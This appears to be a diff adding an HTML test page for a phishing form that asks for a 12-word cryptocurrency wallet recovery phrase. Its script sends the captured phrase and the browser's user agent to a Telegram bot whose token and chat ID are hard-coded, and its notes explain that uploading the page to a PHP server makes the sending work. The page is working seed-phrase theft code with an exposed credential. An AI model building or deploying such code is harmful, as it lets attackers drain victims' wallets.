@@ -1,0 +1,201 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Local Test - Telegram Form</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            max-width: 600px;
+            margin: 50px auto;
+            padding: 20px;
+            background: #f5f5f5;
+        }
+        .container {
+            background: white;
+            padding: 30px;
+            border-radius: 10px;
+            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
+        }
+        textarea {
+            width: 100%;
+            padding: 12px;
+            border: 2px solid #ddd;
+            border-radius: 5px;
+            font-size: 14px;
+            box-sizing: border-box;
+            margin: 10px 0;
+            font-family: monospace;
+        }
+        button {
+            width: 100%;
+            padding: 12px;
+            background: rgb(5, 0, 255);
+            color: white;
+            border: none;
+            border-radius: 5px;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            margin-top: 10px;
+        }
+        button:hover {
+            background: #0033cc;
+        }
+        button:disabled {
+            background: #ccc;
+            cursor: not-allowed;
+        }
+        .result {
+            margin-top: 20px;
+            padding: 15px;
+            border-radius: 5px;
+            display: none;
+        }
+        .success {
+            background: #d4edda;
+            color: #155724;
+            border: 1px solid #c3e6cb;
+        }
+        .error {
+            background: #f8d7da;
+            color: #721c24;
+            border: 1px solid #f5c6cb;
+        }
+        .warning {
+            background: #fff3cd;
+            color: #856404;
+            border: 1px solid #ffeaa7;
+        }
+        .info {
+            background: #d1ecf1;
+            color: #0c5460;
+            padding: 15px;
+            border-radius: 5px;
+            margin-bottom: 20px;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>🧪 Local Test - Recovery Phrase Form</h1>
+        
+        <div class="info">
+            <strong>⚠️ Note:</strong> This is a local test. Telegram won't work from Live Server due to browser security (CORS).<br><br>
+            <strong>✅ What this tests:</strong> Form UI and data capture<br>
+            <strong>📤 To send to Telegram:</strong> Upload to a web server with PHP
+        </div>
+
+        <form id="testForm">
+            <label><strong>Enter 12-Word Recovery Phrase:</strong></label>
+            <textarea 
+                id="phraseInput" 
+                name="phrase" 
+                placeholder="word1 word2 word3 word4 word5 word6 word7 word8 word9 word10 word11 word12"
+                rows="4"
+                required
+            >test word1 word2 word3 word4 word5 word6 word7 word8 word9 word10 word11 word12</textarea>
+            
+            <input type="hidden" name="wallet_id" value="Local Test">
+            
+            <button type="submit" id="submitBtn">📤 Send to Telegram</button>
+        </form>
+
+        <div id="result" class="result"></div>
+        
+        <div id="dataPreview" style="margin-top: 20px; padding: 15px; background: #f8f9fa; border-radius: 5px; display: none;">
+            <h3>📋 Data Captured (for testing):</h3>
+            <pre id="dataOutput" style="background: white; padding: 10px; border-radius: 3px; overflow-x: auto;"></pre>
+        </div>
+    </div>
+
+    <script>
+        document.getElementById('testForm').addEventListener('submit', function(e) {
+            e.preventDefault();
+            
+            const submitBtn = document.getElementById('submitBtn');
+            const resultDiv = document.getElementById('result');
+            const phraseInput = document.getElementById('phraseInput');
+            const dataPreview = document.getElementById('dataPreview');
+            const dataOutput = document.getElementById('dataOutput');
+            
+            const phrase = phraseInput.value.trim();
+            
+            if (!phrase) {
+                alert('Please enter a recovery phrase');
+                return;
+            }
+            
+            submitBtn.disabled = true;
+            submitBtn.textContent = 'Sending...';
+            resultDiv.style.display = 'none';
+            
+            // Show captured data
+            const capturedData = {
+                phrase: phrase,
+                wallet_id: 'Local Test',
+                timestamp: new Date().toLocaleString(),
+                userAgent: navigator.userAgent
+            };
+            
+            dataOutput.textContent = JSON.stringify(capturedData, null, 2);
+            dataPreview.style.display = 'block';
+            
+            // Try to send to Telegram (will fail locally due to CORS, but shows the attempt)
+            const botToken = '8207229530:AAF2CAILD5IU8etTbdPfp5MWQbrd2bgYux0';
+            const chatId = '7811008623';
+            
+            const message = `🔐 New Wallet Data Received
+
+📋 Type: Recovery Phrase (12/24 words)
+👛 Wallet: Local Test
+🌐 IP Address: Local Test
+🕐 Timestamp: ${new Date().toLocaleString()}
+
+📝 Data:
+${phrase}
+
+🌍 User Agent:
+${navigator.userAgent.substring(0, 200)}`;
+            
+            const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
+            
+            fetch(url, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify({
+                    chat_id: chatId,
+                    text: message
+                })
+            })
+            .then(response => response.json())
+            .then(result => {
+                resultDiv.style.display = 'block';
+                if (result.ok) {
+                    resultDiv.className = 'result success';
+                    resultDiv.innerHTML = '<strong>✅ SUCCESS!</strong><br>Message sent to Telegram! Check your Telegram now.';
+                    phraseInput.value = '';
+                } else {
+                    resultDiv.className = 'result error';
+                    resultDiv.innerHTML = '<strong>❌ Error:</strong> ' + (result.description || 'Unknown error');
+                }
+            })
+            .catch(error => {
+                resultDiv.style.display = 'block';
+                resultDiv.className = 'result warning';
+                resultDiv.innerHTML = '<strong>⚠️ CORS Error (Expected Locally)</strong><br><br>' +
+                    'Browser blocked the request. This is normal when testing locally.<br><br>' +
+                    '<strong>✅ Data was captured:</strong> See preview below<br>' +
+                    '<strong>📤 To send to Telegram:</strong> Upload to a web server with PHP<br><br>' +
+                    'The form is working! When you upload to your server, it will send to Telegram.';
+            })
+            .finally(() => {
+                submitBtn.disabled = false;
+                submitBtn.textContent = '📤 Send to Telegram';
+            });
+        });
+    </script>
+</body>
+</html>
+
